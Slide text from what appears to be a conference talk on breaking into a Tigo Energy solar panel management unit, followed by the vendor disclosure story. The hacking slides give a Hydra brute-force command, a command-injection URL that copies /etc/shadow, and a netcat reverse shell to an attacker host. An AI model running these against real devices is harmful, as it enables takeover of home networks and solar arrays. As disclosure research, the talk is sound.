All Your Solar Panels 
are belong to Me
FRED BRET-MOUNET
Who am I?
• Disclaimer:
•
This presentation is based on 
information I gathered through my 
research. It is full of omissions and 
inaccuracies due to my own lack of 
knowlege and incompetency.
•
This research has performed on my 
(extensive) spare time. My 
employer has nothing to do with 
this content.
• WarGames (1983) – the 
first movie about a 
hacker?
“A hacker is one who 
enjoys the intellectual 
challenge of 
creatively overcoming 
limitations of 
software systems to 
achieve novel and 
clever outcomes.”
Gehring, Verna (2004). The Internet 
In Public Life.
This is the topic 
of today!
Tigo Energy ® Maximizer™ Management 
Unit
• (Remotely) Manages individual Solar Panels through Bluetooth.
• In emergency conditions, can (remotely) disable the array by 
shutting down individual solar panels.
• Reports performance back to the 
Cloud.
Tigo Energy ® Maximizer™ Management 
Unit
• (Remotely) Manages individual Solar Panels through Bluetooth.
• In emergency conditions, can (remotely) disable the array by 
shutting down individual solar panels.
• Reports performance back to the 
Cloud.
• Can be used for performance SLAs…
Tigo Energy ® Maximizer™ Management 
Unit
• (Remotely) Manages individual Solar Panels through Bluetooth.
• In emergency conditions, can (remotely) disable the array by 
shutting down individual solar panels.
• Reports performance back to the 
Cloud.
• Can be used for performance SLAs…
Where it started…
Attack Surfaces - Logical
• Open Access Point
• httpd
• Dns
• Ssh
• Serial to tcp
• Dhcp
• Unknown UDP 5002
Attack Surfaces - Physical
• uBoot
• Console
• Rs-489
• USB host
• Emergency Button
Open Access Point
• Thanks https://wigle.net/ !
• Located 160+ out of ~1000 with 24/7 
open AP.
• 10000+ with limited window of 
opportunity for open AP.
Open Access Point
httpd
•All’s lost!
httpd
•Not really!
•Hydra to the rescue:
•hydra -l admin –P rockyou.txt -v  http://192.168.1.10:80/
httpd
•Not really!
•36 hours later:
Admin/Support
httpd
• One page caught my attention!
• And another one (that I had to play with a little):
http://192.168.1.2/cgi-bin/network?host=TIGO2; 
cp%20%2Fetc%2Fshadow%20%20%2Fmnt%2Fffs%2Fvar%2Flmu
dcd.foreign_lmus
httpd
• One page caught my attention!
• And another one (that I had to play with a little):
http://192.168.1.2/cgi-bin/network?host=TIGO2; cp /etc/shadow  
/mnt/ffs/var/lmudcd.foreign_lmus
httpd
• Kick off John The Ripper & HashCat… but I gave up!
• Why spend energy bruteforcing when I have a shell?!
httpd
• NetCat to the rescue ( provided courtesy of the vendor J)
http://192.168.1.129/cgi-bin/network?host=TIGO2;nc -e /bin/sh 192.168.1.135 
9999
• Ps –all:
• 17406 root       0:00 httpd -h /mnt/ffs/www -c /mnt/ffs/etc/httpd.conf -r TigoEnergy
Management Unit
• Now just add yourself after some mount kung fu…
httpd
Hint: Audience applauds now!
What’s next?
• Look around!
• Something caught my attention in the running processes:
3260 root       0:02 openvpn--config supporttcp.conf–syslog
• Yes, the device on my network has a permanent VPN 
tunnel back to the Vendor.
• Not mentioned in any Terms of Use or documentation…
Vendor response
Vendor response
•A dozen emails asking for patience later…
Vendor response
•OMG… I can see my future... 
Vendor response
• Then this:
Vendor response
• Recognize 
the attached 
picture? 
• That 
worked!
• 2 months 
SLA not 
atypical…
Vendor response
•Remember the VPN tunnel?
•Within the hour,
•Open AP shut down
•User removed
•httpd shut down
•But… I was not done helping L
Vendor response
•I have a developer build part of about ~1000 that 
were accidentally shipped.
• No Way! I bought an off the shelf solution trusting I 
was getting what I paid for.
•How does this change everything?
• Not much.
• No VPN backdoor. To be confirmed.
• Open AP window of opportunity dramatically narrowed.
What the Vendor did well!
•Once I had the communication channels open, they 
welcomed my research.
•uBoot custom build with password protection.
•Apparently unique OpenVPN key.
•Log shipping.
•Shipping a replacement device to all affected 
customer.
Why is all this important?
• No need to blow up a power plant. I could have shut down a 
large amount of solar generation.
• Remote control of a network device on your home network.
• Spying
• Botnet
• Anonymizer
• …
• In today’s world of IoT, security is every manufacturer’s 
problem.
Takeaway
•My biggest lessons:
• The dozen or so IoT devices I use are now on a 
segmented & firewalled network.
• Do not reach out to the vendor too soon!
•Responsible disclosure is hard… but it’s the 
only way to go.
Credits
• First & foremost my wonderful Wife … Merci Mon Amour 
pour ton soutien inconditionnel.
• My son, Raphael for showing interest in my Craft.
• Maxym @ Tigo for his support!
• Tigo, for not suing me.
• Defcon team for their invaluable support.
• Paul, friends and colleagues for their review and guidance.